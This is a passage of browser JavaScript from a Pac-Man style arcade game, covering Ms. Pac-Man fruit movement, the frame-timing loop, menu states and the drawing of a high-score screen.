    fruit,
    MsPacFruit = function () {
      BaseFruit.call(this),
        (this.fruits = [
          {
            name: "cherry",
            points: 100,
          },
          {
            name: "strawberry",
            points: 200,
          },
          {
            name: "orange",
            points: 500,
          },
          {
            name: "pretzel",
            points: 700,
          },
          {
            name: "apple",
            points: 1e3,
          },
          {
            name: "pear",
            points: 2e3,
          },
          {
            name: "banana",
            points: 5e3,
          },
        ]),
        (this.dotLimit1 = 64),
        (this.dotLimit2 = 176),
        (this.pen_path = "<<<<<<^^^^^^>>>>>>>>>vvvvvv<<"),
        (this.savedIsPresent = {}),
        (this.savedPixel = {}),
        (this.savedPathMode = {}),
        (this.savedFrame = {}),
        (this.savedNumFrames = {}),
        (this.savedPath = {});
    };
  MsPacFruit.prototype = newChildObject(BaseFruit.prototype, {
    shouldRandomizeFruit: function () {
      return level > 7;
    },
    getFruitFromLevel: function (i) {
      return i <= 7 ? this.fruits[i - 1] : void 0;
    },
    onNewLevel: function () {
      this.shouldRandomizeFruit()
        ? this.setCurrentFruit(0)
        : this.setCurrentFruit(level - 1),
        BaseFruit.prototype.onNewLevel.call(this);
    },
    buildFruitHistory: function () {
      var i;
      for (this.fruitHistory = {}, i = 1; i <= Math.max(level, 7); i++)
        this.fruitHistory[i] = this.fruits[i - 1];
    },
    reset: function () {
      BaseFruit.prototype.reset.call(this),
        (this.frame = 0),
        (this.numFrames = 0),
        (this.path = void 0);
    },
    initiatePath: function (p) {
      (this.frame = 0), (this.numFrames = 16 * p.length), (this.path = p);
    },
    initiate: function () {
      this.shouldRandomizeFruit() && this.setCurrentFruit(getRandomInt(0, 6));
      var entrances = map.fruitPaths.entrances,
        e = entrances[getRandomInt(0, entrances.length - 1)];
      this.initiatePath(e.path),
        (this.pathMode = 0),
        (this.pixel.x = e.start.x),
        (this.pixel.y = e.start.y);
    },
    isPresent: function () {
      return this.frame < this.numFrames;
    },
    bounceFrames:
      ((U = {
        dx: 0,
        dy: -1,
      }),
      (D = {
        dx: 0,
        dy: 1,
      }),
      (L = {
        dx: -1,
        dy: 0,
      }),
      (R = {
        dx: 1,
        dy: 0,
      }),
      (UL = {
        dx: -1,
        dy: -1,
      }),
      (UR = {
        dx: 1,
        dy: -1,
      }),
      (DL = {
        dx: -1,
        dy: 1,
      }),
      (DR = {
        dx: 1,
        dy: 1,
      }),
      (Z = {
        dx: 0,
        dy: 0,
      }),
      {
        "^": [U, U, U, U, U, U, U, U, U, Z, U, Z, Z, D, Z, D],
        ">": [Z, UR, Z, R, Z, UR, Z, R, Z, R, Z, R, Z, DR, DR, Z],
        "<": [Z, Z, UL, Z, L, Z, UL, Z, L, Z, L, Z, L, Z, DL, DL],
        v: [Z, D, D, D, D, D, D, D, D, D, D, D, U, U, Z, U],
      }),
    move: function () {
      var p = this.path[Math.floor(this.frame / 16)],
        b = this.bounceFrames[p][this.frame % 16];
      (this.pixel.x += b.dx), (this.pixel.y += b.dy), this.frame++;
    },
    setNextPath: function () {
      if (0 == this.pathMode)
        (this.pathMode = 1), this.initiatePath(this.pen_path);
      else if (1 == this.pathMode) {
        this.pathMode = 2;
        var exits = map.fruitPaths.exits,
          e = exits[getRandomInt(0, exits.length - 1)];
        this.initiatePath(e.path);
      } else 2 == this.pathMode && this.reset();
    },
    update: function () {
      BaseFruit.prototype.update.call(this),
        this.isPresent() &&
          (this.move(), this.frame == this.numFrames && this.setNextPath());
    },
    save: function (t) {
      BaseFruit.prototype.save.call(this, t),
        (this.savedPixel[t] = this.isPresent()
          ? {
              x: this.pixel.x,
              y: this.pixel.y,
            }
          : void 0),
        (this.savedPathMode[t] = this.pathMode),
        (this.savedFrame[t] = this.frame),
        (this.savedNumFrames[t] = this.numFrames),
        (this.savedPath[t] = this.path);
    },
    load: function (t) {
      BaseFruit.prototype.load.call(this, t),
        this.savedPixel[t] &&
          ((this.pixel.x = this.savedPixel[t].x),
          (this.pixel.y = this.savedPixel[t].y)),
        (this.pathMode = this.savedPathMode[t]),
        (this.frame = this.savedFrame[t]),
        (this.numFrames = this.savedNumFrames[t]),
        (this.path = this.savedPath[t]);
    },
  });
  var pacfruit,
    mspacfruit,
    state,
    exitTo,
    menu,
    getIconAnimFrame,
    frames,
    startLevel,
    commonDraw,
    flashFloorAndDraw,
    setFruitFromGameMode =
      ((pacfruit = new PacFruit()),
      (mspacfruit = new MsPacFruit()),
      (fruit = pacfruit),
      function () {
        fruit = 0 == gameMode ? pacfruit : mspacfruit;
      }),
    executive = (function () {
      var gameTime,
        fps,
        framePeriod = 1e3 / 60,
        paused = !1,
        running = !1;
      !(function () {
        for (
          var lastTime = 0, vendors = ["ms", "moz", "webkit", "o"], x = 0;
          x < vendors.length && !window.requestAnimationFrame;
          ++x
        )
          (window.requestAnimationFrame =
            window[vendors[x] + "RequestAnimationFrame"]),
            (window.cancelAnimationFrame =
              window[vendors[x] + "CancelAnimationFrame"] ||
              window[vendors[x] + "CancelRequestAnimationFrame"]);
        window.requestAnimationFrame ||
          (window.requestAnimationFrame = function (callback, element) {
            var currTime = new Date().getTime(),
              timeToCall = Math.max(0, 16 - (currTime - lastTime)),
              id = window.setTimeout(function () {
                callback(currTime + timeToCall);
              }, timeToCall);
            return (lastTime = currTime + timeToCall), id;
          }),
          window.cancelAnimationFrame ||
            (window.cancelAnimationFrame = function (id) {
              clearTimeout(id);
            });
      })();
      var times,
        startIndex,
        endIndex,
        filled,
        reqFrame,
        updateFps =
          ((times = []),
          (startIndex = 0),
          (endIndex = -1),
          (filled = !1),
          function (now) {
            filled && (startIndex = (startIndex + 1) % 60),
              59 == (endIndex = (endIndex + 1) % 60) && (filled = !0),
              (times[endIndex] = now);
            var seconds = (now - times[startIndex]) / 1e3,
              frames = endIndex - startIndex;
            frames < 0 && (frames += 60), (fps = frames / seconds);
          }),
        tick = function (now) {
          null == gameTime && (gameTime = now), updateFps(now);
          for (
            gameTime = Math.max(gameTime, now - 3 * framePeriod),
              (paused || inGameMenu.isOpen()) && (gameTime = now),
              hud.update();
            gameTime < now;

          )
            state.update(), (gameTime += framePeriod);
          renderer.beginFrame(),
            state.draw(),
            hud.isValidState() && renderer.renderFunc(hud.draw),
            renderer.endFrame(),
            (reqFrame = requestAnimationFrame(tick));
        };
      return {
        getFramePeriod: function () {
          return framePeriod;
        },
        setUpdatesPerSecond: function (ups) {
          (framePeriod = 1e3 / ups), vcr.onFramePeriodChange();
        },
        init: function () {
          var that = this;
          window.addEventListener("focus", function () {
            that.start();
          }),
            window.addEventListener("blur", function () {
              that.stop();
            }),
            this.start();
        },
        start: function () {
          running || ((reqFrame = requestAnimationFrame(tick)), (running = !0));
        },
        stop: function () {
          running && (cancelAnimationFrame(reqFrame), (running = !1));
        },
        togglePause: function () {
          paused = !paused;
        },
        isPaused: function () {
          return paused;
        },
        getFps: function () {
          return fps;
        },
      };
    })(),
    switchState = function (
      nextState,
      fadeDuration,
      continueUpdate1,
      continueUpdate2
    ) {
      (state = fadeDuration
        ? fadeNextState(
            state,
            nextState,
            fadeDuration,
            continueUpdate1,
            continueUpdate2
          )
        : nextState),
        audio.silence(),
        state.init(),
        executive.isPaused() && executive.togglePause();
    },
    fadeNextState = function (
      prevState,
      nextState,
      frameDuration,
      continueUpdate1,
      continueUpdate2
    ) {
      var frames,
        midFrame = Math.floor(frameDuration / 2),
        getStateTime = function () {
          return (frames / frameDuration) * 2 + (frames < midFrame ? 0 : -1);
        },
        initialized = !1;
      return {
        init: function () {
          (frames = 0), (initialized = !0);
        },
        draw: function () {
          if (initialized) {
            var t = getStateTime();
            frames < midFrame
              ? prevState &&
                (prevState.draw(),
                renderer.setOverlayColor("rgba(0,0,0," + t + ")"))
              : frames > midFrame &&
                (nextState.draw(),
                renderer.setOverlayColor("rgba(0,0,0," + (1 - t) + ")"));
          }
        },
        update: function () {
          frames < midFrame
            ? continueUpdate1 && prevState.update()
            : frames == midFrame
            ? nextState.init()
            : frames < frameDuration
            ? continueUpdate2 && nextState.update()
            : ((state = nextState), (initialized = !1)),
            frames++;
        },
      };
    },
    homeState =
      ((exitTo = function (s) {
        switchState(s), menu.disable();
      }),
      (menu = new Menu(
        "CHOOSE YOU'RE PACMAN GAME",
        16,
        0,
        194,
        24,
        8,
        "8px ArcadeR",
        "#EEE"
      )),
      (getIconAnimFrame = function (frame) {
        return (
          (frame = Math.floor(frame / 3) + 1),
          3 == (frame %= 4) && (frame = 1),
          frame
        );
      }),
      menu.addTextIconButton(
        getGameName(0),
        function () {
          (gameMode = 0), exitTo(preNewGameState);
        },
        function (ctx, x, y, frame) {
          atlas.drawPacmanSprite(ctx, x, y, 3, getIconAnimFrame(frame));
        }
      ),
      menu.addTextIconButton(
        getGameName(1),
        function () {
          (gameMode = 1), exitTo(preNewGameState);
        },
        function (ctx, x, y, frame) {
          atlas.drawMsPacmanSprite(ctx, x, y, 3, getIconAnimFrame(frame));
        }
      ),
      menu.addTextIconButton(
        getGameName(2),
        function () {
          (gameMode = 2), exitTo(preNewGameState);
        },
        function (ctx, x, y, frame) {
          drawCookiemanSprite(ctx, x, y, 3, getIconAnimFrame(frame), !0);
        }
      ),
      menu.addSpacer(0.5),
      menu.addTextIconButton(
        "LEARN",
        function () {
          exitTo(learnState);
        },
        function (ctx, x, y, frame) {
          atlas.drawGhostSprite(
            ctx,
            x,
            y,
            Math.floor(frame / 8) % 2,
            3,
            !1,
            !1,
            !1,
            blinky.color
          );
        }
      ),
      {
        init: function () {
          menu.enable(), audio.coffeeBreakMusic.startLoop();
        },
        draw: function () {
          renderer.clearMapFrame(),
            renderer.beginMapClip(),
            renderer.renderFunc(menu.draw, menu),
            renderer.endMapClip();
        },
        update: function () {
          menu.update();
        },
        getMenu: function () {
          return menu;
        },
      }),
    learnState = (function () {
      var menu = new Menu("LEARN", 16, -8, 194, 24, 8, "8px ArcadeR", "#EEE");
      menu.addSpacer(7),
        menu.addTextButton("BACK", function () {
          switchState(homeState),
            menu.disable(),
            forEachCharBtn(function (btn) {
              btn.disable();
            }),
            setAllVisibility(!0),
            clearCheats();
        }),
        (menu.backButton = menu.buttons[menu.buttonCount - 1]),
        (menu.noArrowKeys = !0);
      var w = 30,
        x = 41,
        redBtn = new Button(x, 32, w, 30, function () {
          setAllVisibility(!1),
            (blinky.isVisible = !0),
            setVisibility(blinky, !0);
        });
      redBtn.setIcon(function (ctx, x, y, frame) {
        getGhostDrawFunc()(
          ctx,
          x,
          y,
          Math.floor(frame / 6) % 2,
          2,
          void 0,
          void 0,
          void 0,
          blinky.color
        );
      });
      var pinkBtn = new Button((x += 38), 32, w, 30, function () {
        setAllVisibility(!1), setVisibility(pinky, !0);
      });
      pinkBtn.setIcon(function (ctx, x, y, frame) {
        getGhostDrawFunc()(
          ctx,
          x,
          y,
          Math.floor(frame / 6) % 2,
          2,
          void 0,
          void 0,
          void 0,
          pinky.color
        );
      });
      var cyanBtn = new Button((x += 38), 32, w, 30, function () {
        setAllVisibility(!1), setVisibility(inky, !0);
      });
      cyanBtn.setIcon(function (ctx, x, y, frame) {
        getGhostDrawFunc()(
          ctx,
          x,
          y,
          Math.floor(frame / 6) % 2,
          2,
          void 0,
          void 0,
          void 0,
          inky.color
        );
      });
      var orangeBtn = new Button((x += 38), 32, w, 30, function () {
        setAllVisibility(!1), setVisibility(clyde, !0);
      });
      orangeBtn.setIcon(function (ctx, x, y, frame) {
        getGhostDrawFunc()(
          ctx,
          x,
          y,
          Math.floor(frame / 6) % 2,
          2,
          void 0,
          void 0,
          void 0,
          clyde.color
        );
      });
      var forEachCharBtn = function (callback) {
          callback(redBtn),
            callback(pinkBtn),
            callback(cyanBtn),
            callback(orangeBtn);
        },
        setVisibility = function (g, visible) {
          g.isVisible = g.isDrawTarget = g.isDrawPath = visible;
        },
        setAllVisibility = function (visible) {
          setVisibility(blinky, visible),
            setVisibility(pinky, visible),
            setVisibility(inky, visible),
            setVisibility(clyde, visible);
        };
      return {
        init: function () {
          for (
            menu.enable(),
              forEachCharBtn(function (btn) {
                btn.enable();
              }),
              map = mapLearn,
              renderer.drawMap(),
              level = 1,
              practiceMode = !1,
              turboMode = !1,
              gameMode = 0,
              ghostCommander.reset(),
              energizer.reset(),
              ghostCommander.setCommand(GHOST_CMD_CHASE),
              ghostReleaser.onNewLevel(),
              elroyTimer.onNewLevel(),
              i = 0;
            i < 4;
            i++
          ) {
            var a = actors[i];
            a.reset(), (a.mode = 0);
          }
          blinky.setPos(111, 104 + midTile_y),
            pinky.setPos(120 + midTile_x, 104 + midTile_y),
            inky.setPos(72 + midTile_x, 128 + midTile_y),
            clyde.setPos(144 + midTile_x, 128 + midTile_y),
            pacman.reset(),
            pacman.setPos(111, 176 + midTile_y),
            redBtn.onclick();
        },
        draw: function () {
          renderer.blitMap(),
            renderer.renderFunc(menu.draw, menu),
            forEachCharBtn(function (btn) {
              renderer.renderFunc(btn.draw, btn);
            }),
            renderer.beginMapClip(),
            renderer.drawPaths(),
            renderer.drawActors(),
            renderer.drawTargets(),
            renderer.endMapClip();
        },
        update: function () {
          var i, j;
          for (
            menu.update(),
              forEachCharBtn(function (btn) {
                btn.update();
              }),
              j = 0;
            j < 2;
            j++
          )
            for (pacman.update(j), i = 0; i < 4; i++) actors[i].update(j);
          for (i = 0; i < 5; i++) actors[i].frames++;
        },
        getMenu: function () {
          return menu;
        },
      };
    })(),
    gameTitleState = (function () {
      var name,
        nameColor,
        resetTitle = function () {
          yellowBtn.isSelected
            ? ((name = getGameName()),
              (nameColor = 2 == gameMode ? "#47b8ff" : pacman.color))
            : redBtn.isSelected
            ? ((name = getGhostNames()[0]), (nameColor = blinky.color))
            : pinkBtn.isSelected
            ? ((name = getGhostNames()[1]), (nameColor = pinky.color))
            : cyanBtn.isSelected
            ? ((name = getGhostNames()[2]), (nameColor = inky.color))
            : orangeBtn.isSelected
            ? ((name = getGhostNames()[3]), (nameColor = clyde.color))
            : ((name = getGameName()), (nameColor = "#FFF"));
        },
        w = 20,
        x = 53,
        yellowBtn = new Button(x, 24, w, 30, function () {
          1 == gameMode ? (gameMode = 3) : 3 == gameMode && (gameMode = 1);
        });
      yellowBtn.setIcon(function (ctx, x, y, frame) {
        getPlayerDrawFunc()(
          ctx,
          x,
          y,
          3,
          pacman.getAnimFrame(
            pacman.getStepFrame(
              Math.floor((0 == gameMode ? frame + 4 : frame) / 1.5)
            )
          ),
          !0
        );
      });
      var redBtn = new Button((x += 40), 24, w, 30);
      redBtn.setIcon(function (ctx, x, y, frame) {
        getGhostDrawFunc()(
          ctx,
          x,
          y,
          Math.floor(frame / 6) % 2,
          1,
          void 0,
          void 0,
          void 0,
          blinky.color
        );
      });
      var pinkBtn = new Button((x += w), 24, w, 30);
      pinkBtn.setIcon(function (ctx, x, y, frame) {
        getGhostDrawFunc()(
          ctx,
          x,
          y,
          Math.floor(frame / 6) % 2,
          1,
          void 0,
          void 0,
          void 0,
          pinky.color
        );
      });
      var cyanBtn = new Button((x += w), 24, w, 30);
      cyanBtn.setIcon(function (ctx, x, y, frame) {
        getGhostDrawFunc()(
          ctx,
          x,
          y,
          Math.floor(frame / 6) % 2,
          1,
          void 0,
          void 0,
          void 0,
          inky.color
        );
      });
      var orangeBtn = new Button((x += w), 24, w, 30);
      orangeBtn.setIcon(function (ctx, x, y, frame) {
        getGhostDrawFunc()(
          ctx,
          x,
          y,
          Math.floor(frame / 6) % 2,
          1,
          void 0,
          void 0,
          void 0,
          clyde.color
        );
      });
      var forEachCharBtn = function (callback) {
        callback(yellowBtn),
          callback(redBtn),
          callback(pinkBtn),
          callback(cyanBtn),
          callback(orangeBtn);
      };
      return (
        forEachCharBtn(function (btn) {
          btn.borderBlurColor = btn.borderFocusColor = "#000";
        }),
        {
          init: function () {
            resetTitle(),
              forEachCharBtn(function (btn) {
                btn.enable();
              });
          },
          shutdown: function () {
            forEachCharBtn(function (btn) {
              btn.disable();
            });
          },
          draw: function () {
            forEachCharBtn(function (btn) {
              renderer.renderFunc(btn.draw, btn);
            }),
              resetTitle(),
              renderer.renderFunc(function (ctx) {
                (ctx.font = "8px ArcadeR"),
                  (ctx.fillStyle = nameColor),
                  (ctx.textAlign = "center"),
                  (ctx.textBaseline = "top"),
                  ctx.fillText(name, 113, 8);
              });
          },
          update: function () {
            forEachCharBtn(function (btn) {
              btn.update();
            });
          },
          getYellowBtn: function () {
            return yellowBtn;
          },
        }
      );
    })(),
    preNewGameState = (function () {
      var exitTo = function (s, fade) {
          gameTitleState.shutdown(), menu.disable(), switchState(s, fade);
        },
        menu = new Menu("", 16, 0, 194, 24, 8, "8px ArcadeR", "#EEE");
      return (
        menu.addSpacer(2),
        menu.addTextButton("PLAY", function () {
          (practiceMode = !1),
            (turboMode = !1),
            newGameState.setStartLevel(1),
            exitTo(newGameState, 60);
        }),
        menu.addTextButton("PLAY TURBO", function () {
          (practiceMode = !1),
            (turboMode = !0),
            newGameState.setStartLevel(1),
            exitTo(newGameState, 60);
        }),
        menu.addTextButton("PRACTICE", function () {
          (practiceMode = !0), (turboMode = !1), exitTo(selectActState);
        }),
        menu.addSpacer(0.5),
        menu.addTextButton("CUTSCENES", function () {
          exitTo(cutSceneMenuState);
        }),
        menu.addTextButton("ABOUT", function () {
          exitTo(aboutGameState);
        }),
        menu.addSpacer(0.5),
        menu.addTextButton("BACK", function () {
          exitTo(homeState);
        }),
        (menu.backButton = menu.buttons[menu.buttonCount - 1]),
        {
          init: function () {
            audio.startMusic.play(),
              menu.enable(),
              gameTitleState.init(),
              (map = void 0);
          },
          draw: function () {
            renderer.clearMapFrame(),
              renderer.renderFunc(menu.draw, menu),
              gameTitleState.draw();
          },
          update: function () {
            gameTitleState.update();
          },
          getMenu: function () {
            return menu;
          },
        }
      );
    })(),
    selectActState = (function () {
      var menu,
        startAct = 1,
        exitTo = function (state, fade) {
          gameTitleState.shutdown(), menu.disable(), switchState(state, fade);
        },
        chooseLevelFromAct = function (act) {
          selectLevelState.setAct(act), exitTo(selectLevelState);
        },
        scrollToAct = function (act) {
          selectActState.setStartAct(act), exitTo(selectActState);
        },
        drawArrow = function (ctx, x, y, dir) {
          ctx.save(),
            ctx.translate(x, y),
            ctx.scale(1, dir),
            ctx.beginPath(),
            ctx.moveTo(0, -4),
            ctx.lineTo(8, 4),
            ctx.lineTo(-8, 4),
            ctx.closePath(),
            (ctx.fillStyle = "#FFF"),
            ctx.fill(),
            ctx.restore();
        };
      return {
        init: function () {
          !(function (act) {
            var i, range;
            for (
              startAct = act,
                (menu = new Menu(
                  "",
                  16,
                  0,
                  194,
                  24,
                  8,
                  "8px ArcadeR",
                  "#EEE"
                )).addSpacer(2),
                menu.addIconButton(
                  function (ctx, x, y) {
                    drawArrow(ctx, x, y, 1);
                  },
                  function () {
                    scrollToAct(Math.max(1, act - 4));
                  }
                ),
                i = 0;
              i < 4;
              i++
            )
              (range = getActRange(act + i)),
                menu.addTextIconButton(
                  "LEVELS " + range[0] + "-" + range[1],
                  (function (j) {
                    return function () {
                      chooseLevelFromAct(act + j);
                    };
                  })(i),
                  (function (j) {
                    return function (ctx, x, y) {
                      var s = (8 / 3) * 2,
                        r = 8 / 6;
                      ctx.save(),
                        ctx.translate(x, y),
                        ctx.beginPath(),
                        ctx.moveTo(-s, 0),
                        ctx.lineTo(-s, -r),
                        ctx.quadraticCurveTo(-s, -s, -r, -s),
                        ctx.lineTo(r, -s),
                        ctx.quadraticCurveTo(s, -s, s, -r),
                        ctx.lineTo(s, r),
                        ctx.quadraticCurveTo(s, s, r, s),
                        ctx.lineTo(-r, s),
                        ctx.quadraticCurveTo(-s, s, -s, r),
                        ctx.closePath();
                      var colors = getActColor(act + j);
                      (ctx.fillStyle = colors.wallFillColor),
                        (ctx.strokeStyle = colors.wallStrokeColor),
                        ctx.fill(),
                        ctx.stroke(),
                        ctx.restore();
                    };
                  })(i)
                );
            menu.addIconButton(
              function (ctx, x, y) {
                drawArrow(ctx, x, y, -1);
              },
              function () {
                scrollToAct(act + 4);
              }
            ),
              menu.addTextButton("BACK", function () {
                exitTo(preNewGameState);
              }),
              (menu.backButton = menu.buttons[menu.buttonCount - 1]),
              menu.enable();
          })(startAct),
            gameTitleState.init();
        },
        setStartAct: function (act) {
          startAct = act;
        },
        draw: function () {
          renderer.clearMapFrame(),
            renderer.renderFunc(menu.draw, menu),
            gameTitleState.draw();
        },
        update: function () {
          gameTitleState.update();
        },
        getMenu: function () {
          return menu;
        },
      };
    })(),
    selectLevelState = (function () {
      var menu,
        act = 1,
        exitTo = function (state, fade) {
          gameTitleState.shutdown(), menu.disable(), switchState(state, fade);
        },
        playLevel = function (i) {
          newGameState.setStartLevel(i), exitTo(newGameState, 60);
        };
      return {
        init: function () {
          setFruitFromGameMode(),
            (function (act) {
              var i,
                range = getActRange(act);
              if (
                ((menu = new Menu(
                  "",
                  16,
                  0,
                  194,
                  24,
                  8,
                  "8px ArcadeR",
                  "#EEE"
                )).addSpacer(2),
                range[0] < range[1])
              )
                for (i = range[0]; i <= range[1]; i++)
                  menu.addTextIconButton(
                    "LEVEL " + i,
                    (function (j) {
                      return function () {
                        playLevel(j);
                      };
                    })(i),
                    (function (j) {
                      return function (ctx, x, y) {
                        var f = fruit.getFruitFromLevel(j);
                        f && atlas.drawFruitSprite(ctx, x, y, f.name);
                      };
                    })(i)
                  );
              menu.addSpacer(0.5),
                menu.addTextButton("BACK", function () {
                  exitTo(selectActState);
                }),
                (menu.backButton = menu.buttons[menu.buttonCount - 1]),
                menu.enable();
            })(act),
            gameTitleState.init();
        },
        setAct: function (a) {
          act = a;
        },
        draw: function () {
          renderer.clearMapFrame(),
            renderer.renderFunc(menu.draw, menu),
            gameTitleState.draw();
        },
        update: function () {
          gameTitleState.update();
        },
        getMenu: function () {
          return menu;
        },
      };
    })(),
    aboutGameState = (function () {
      var desc,
        numDescLines,
        menu = new Menu("", 16, 0, 194, 24, 8, "8px ArcadeR", "#EEE");
      menu.addSpacer(8),
        menu.addTextButton("BACK", function () {
          var s, fade;
          (s = preNewGameState),
            gameTitleState.shutdown(),
            menu.disable(),
            switchState(s, fade);
        }),
        (menu.backButton = menu.buttons[menu.buttonCount - 1]);
      var drawDesc = function (ctx) {
        (ctx.font = "8px ArcadeR"),
          (ctx.fillStyle = "#FFF"),
          (ctx.textBaseline = "top"),
          (ctx.textAlign = "center");
        var i;
        for (i = 0; i < numDescLines; i++)
          ctx.fillText(desc[i], 112, 96 + 2 * i * 8);
      };
      return {
        init: function () {
          menu.enable(), gameTitleState.init();
        },
        draw: function () {
          renderer.clearMapFrame(),
            renderer.renderFunc(menu.draw, menu),
            gameTitleState.draw(),
            (desc = getGameDescription()),
            (numDescLines = desc.length),
            renderer.renderFunc(drawDesc);
        },
        update: function () {
          gameTitleState.update();
        },
        getMenu: function () {
          return menu;
        },
      };
    })(),
    cutSceneMenuState = (function () {
      var exitToCutscene = function (s) {
          s &&
            (gameTitleState.shutdown(),
            menu.disable(),
            playCutScene(s, cutSceneMenuState));
        },
        menu = new Menu("", 16, 0, 194, 24, 8, "8px ArcadeR", "#EEE");
      return (
        menu.addSpacer(2),
        menu.addTextButton("CUTSCENE 1", function () {
          exitToCutscene(cutscenes[gameMode][0]);
        }),
        menu.addTextButton("CUTSCENE 2", function () {
          exitToCutscene(cutscenes[gameMode][1]);
        }),
        menu.addTextButton("CUTSCENE 3", function () {
          exitToCutscene(cutscenes[gameMode][2]);
        }),
        menu.addSpacer(),
        menu.addTextButton("BACK", function () {
          var s, fade;
          (s = preNewGameState),
            gameTitleState.shutdown(),
            menu.disable(),
            switchState(s, fade);
        }),
        (menu.backButton = menu.buttons[menu.buttonCount - 1]),
        {
          init: function () {
            menu.enable(), gameTitleState.init(), (level = 0);
          },
          draw: function () {
            renderer.clearMapFrame(),
              renderer.renderFunc(menu.draw, menu),
              gameTitleState.draw();
          },
          update: function () {
            gameTitleState.update();
          },
          getMenu: function () {
            return menu;
          },
        }
      );
    })(),
    newGameState =
      ((function () {
        var menu = new Menu("", 16, 242, 194, 24, 8, "8px ArcadeR", "#EEE");
        menu.addTextButton("BACK", function () {
          switchState(homeState), menu.disable();
        }),
          (menu.backButton = menu.buttons[menu.buttonCount - 1]);
        var numBulbs,
          frame = 0,
          bulbs = {};
        !(function () {
          for (
            var i = 0,
              x0 = -12,
              y0 = -8,
              addBulb = function (x, y) {
                bulbs[i++] = {
                  x: x,
                  y: y,
                };
              };
            y0 < 224;
            y0 += 3
          )
            addBulb(x0, y0);
          for (; x0 < 132; x0 += 3) addBulb(x0, y0);
          for (; y0 > -8; y0 -= 3) addBulb(x0, y0);
          for (; x0 > -12; x0 -= 3) addBulb(x0, y0);
          numBulbs = i;
        })();
        var drawScoreBox = function (ctx) {
            ctx.fillStyle = "#555";
            var i, b;
            for (i = 0; i < numBulbs; i++)
              (b = bulbs[i]), ctx.fillRect(b.x, b.y, 2, 2);
            for (ctx.fillStyle = "#FFF", i = 0; i < 63; i++)
              (b = bulbs[(4 * i + Math.floor(frame / 2)) % numBulbs]),
                ctx.fillRect(b.x, b.y, 2, 2);
            (ctx.font = "8px ArcadeR"),
              (ctx.textBaseline = "top"),
              (ctx.textAlign = "right");
            var x, y;
            (x = 72),
              (y = 0),
              (ctx.fillStyle = "#FFF"),
              ctx.fillText("HIGH SCORES", 104, y),
              (y += 32);
            var drawContrails = function (x, y) {
              var dy;
              for (
                ctx.lineWidth = 1,
                  ctx.lineCap = "round",
                  ctx.strokeStyle = "rgba(255,255,255,0.5)",
                  ctx.save(),
                  ctx.translate(-2.5, 0),
                  dy = -4;
                dy <= 4;
                dy += 2
              )
                ctx.beginPath(),
                  ctx.moveTo(x + 8, y + dy),
                  ctx.lineTo(x + 8 * (0.5 * Math.random() + 1.5), y + dy),
                  ctx.stroke();
              ctx.restore();
            };
            (ctx.fillStyle = "#AAA"),
              ctx.fillText(highScores[0], x, y),
              atlas.drawPacmanSprite(ctx, 88, y + 4, 1, 1),
              (y += 16),
              (ctx.fillStyle = "#AAA"),
              ctx.fillText(highScores[1], x, y),
              drawContrails(88, y + 4),
              atlas.drawPacmanSprite(ctx, 88, y + 4, 1, 1),
              (y += 24),
              (ctx.fillStyle = "#AAA"),
              ctx.fillText(highScores[2], x, y),
              atlas.drawMsPacmanSprite(ctx, 88, y + 4, 1, 1),
              (y += 16),
              (ctx.fillStyle = "#AAA"),
              ctx.fillText(highScores[3], x, y),
              drawContrails(88, y + 4),
              atlas.drawMsPacmanSprite(ctx, 88, y + 4, 1, 1),
              (y += 24),
              (ctx.fillStyle = "#AAA"),
              ctx.fillText(highScores[6], x, y),
              atlas.drawOttoSprite(ctx, 88, y + 4, 1, 0),
              (y += 16),
              (ctx.fillStyle = "#AAA"),
              ctx.fillText(highScores[7], x, y),
              drawContrails(88, y + 4),
              atlas.drawOttoSprite(ctx, 88, y + 4, 1, 0),
              (y += 24),
              (ctx.fillStyle = "#AAA"),
              ctx.fillText(highScores[4], x, y),
              atlas.drawCookiemanSprite(ctx, 88, y + 4, 1, 1),
              (y += 16),
              (ctx.fillStyle = "#AAA"),
              ctx.fillText(highScores[5], x, y),
              drawContrails(88, y + 4),
              atlas.drawCookiemanSprite(ctx, 88, y + 4, 1, 1);
          },
          drawFood = function (ctx) {
            (ctx.globalAlpha = 0.5),
              (ctx.font = "8px sans-serif"),
              (ctx.textBaseline = "middle"),
              (ctx.textAlign = "left");
            var x = 160,
              y = 0;
            (ctx.fillStyle = "#ffb8ae"),
              ctx.fillRect(x - 1, y - 1.5, 2, 2),
              (ctx.fillStyle = "#FFF"),
              ctx.fillText("10", x + 8, y),
              (y += 12),
              (ctx.fillStyle = "#ffb8ae"),
              ctx.beginPath(),
              ctx.arc(x, y - 0.5, 4, 0, 2 * Math.PI),
              ctx.fill(),
              (ctx.fillStyle = "#FFF"),
              ctx.fillText("50", x + 8, y),
              (y += 24),
              atlas.drawGhostSprite(ctx, x, y, 0, 3, !0),
              atlas.drawGhostPoints(ctx, x + 16, y, 200);
            var alpha = ctx.globalAlpha;
            (y += 16),
              (ctx.globalAlpha = 0.5 * alpha),
              atlas.drawGhostSprite(ctx, x, y, 0, 3, !0),
              (ctx.globalAlpha = alpha),
              atlas.drawGhostSprite(ctx, x + 16, y, 0, 3, !0),
              atlas.drawGhostPoints(ctx, x + 32, y, 400),
              (y += 16),
              (ctx.globalAlpha = 0.5 * alpha),
              atlas.drawGhostSprite(ctx, x, y, 0, 3, !0),
              atlas.drawGhostSprite(ctx, x + 16, y, 0, 3, !0),
              (ctx.globalAlpha = alpha),
              atlas.drawGhostSprite(ctx, x + 32, y, 0, 3, !0),
              atlas.drawGhostPoints(ctx, x + 48, y, 800),
              (y += 16),
              (ctx.globalAlpha = 0.5 * alpha),
              atlas.drawGhostSprite(ctx, x, y, 0, 3, !0),
              atlas.drawGhostSprite(ctx, x + 16, y, 0, 3, !0),
              atlas.drawGhostSprite(ctx, x + 32, y, 0, 3, !0),
              (ctx.globalAlpha = alpha),
              atlas.drawGhostSprite(ctx, x + 48, y, 0, 3, !0),
              atlas.drawGhostPoints(ctx, x + 64, y, 1600);
            var i,
              f,
              mspac_fruits = [
                {
                  name: "cherry",
                  points: 100,
                },
                {
                  name: "strawberry",
                  points: 200,
                },
                {
                  name: "orange",
                  points: 500,
                },
                {
                  name: "pretzel",
                  points: 700,
                },
                {
                  name: "apple",
                  points: 1e3,
                },
                {
                  name: "pear",
                  points: 2e3,
                },
                {
                  name: "banana",
                  points: 5e3,
                },
              ],
              pac_fruits = [
                {
                  name: "cherry",
                  points: 100,
                },
                {
                  name: "strawberry",
                  points: 300,
                },
                {
                  name: "orange",
                  points: 500,
                },
                {
                  name: "apple",
                  points: 700,
                },
                {
                  name: "melon",
                  points: 1e3,
                },
                {
                  name: "galaxian",
                  points: 2e3,
                },
                {
